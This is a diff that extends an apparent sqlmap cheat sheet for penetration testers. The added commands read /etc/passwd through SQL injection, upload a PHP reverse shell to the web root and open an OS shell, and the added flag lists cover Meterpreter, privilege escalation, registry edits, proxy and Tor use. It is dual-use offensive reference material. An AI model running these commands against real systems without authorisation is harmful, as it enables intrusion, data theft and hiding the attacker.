@@ -70,4 +70,72 @@ SQLmap File System Access - These options can be used to access the back-end dat
 
 Read File From Remote System
 
+```
+sqlmap -r req.txt -p namePeople --file-read=/etc/passwd --batch
+```
+
+Upload File to Remote System
+
+```
+sqlmap -r req.txt -p namePeople --file-write=/home/user/rshell.php --file-dest=/var/www/html --batch
+```
+
+SQLmap Operating System Access - These options can be used to access the back-end database management system underlying operating system
+
+```
+ --os-cmd=OSCMD      Execute an operating system command
+ --os-shell          Prompt for an interactive operating system shell
+ --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+ --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
+ --os-bof            Stored procedure buffer overflow exploitation
+ --priv-esc          Database process user privilege escalation
+ --msf-path=MSFPATH  Local path where Metasploit Framework is installed
+ --tmp-path=TMPPATH  Remote absolute path of temporary files directory
+```
+
+```
+sqlmap -r req.txt -p namePeople --os-cmd=ifconfig
+sqlmap -r req.txt -p namePeople --os-shell
+```
+
+SQLmap Windows Registry Access - These options can be used to access the back-end database management system Windows registry
+
+```
+--reg-read          Read a Windows registry key value
+--reg-add           Write a Windows registry key value data
+--reg-del           Delete a Windows registry key value
+--reg-key=REGKEY    Windows registry key
+--reg-value=REGVAL  Windows registry key value
+--reg-data=REGDATA  Windows registry key value data
+--reg-type=REGTYPE  Windows registry key value type
+```
+
+SQLmap with Anonymity
+
+```
+--proxy=PROXY       Use a proxy to connect to the target URL
+--proxy-cred=PRO..  Proxy authentication credentials (name:password)
+--proxy-file=PRO..  Load proxy list from a file
+--proxy-freq=PRO..  Requests between change of proxy from a given list
+--tor               Use Tor anonymity network
+--tor-port=TORPORT  Set Tor proxy port other than default
+--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
+--check-tor         Check to see if Tor is used properly
+```
+
+SQLmap over Proxy
+
+```
+sqlmap --proxy="http://<proxy-ip>:<proxy-port>" 
+sqlmap --proxy="http://<proxy-ip>:<proxy-port>" --proxy-cred=username:password
+```
+
+SQLmap over TOR
+
+```
+sqlmap --tor --tor-port=9050 --tor-type=SOCKS5 -r req.txt --dbs
+sqlmap --check-tor
+
+```
+
 {% embed url="https://www.poplabsec.com/complete-sqlmap-tutorial/" %}
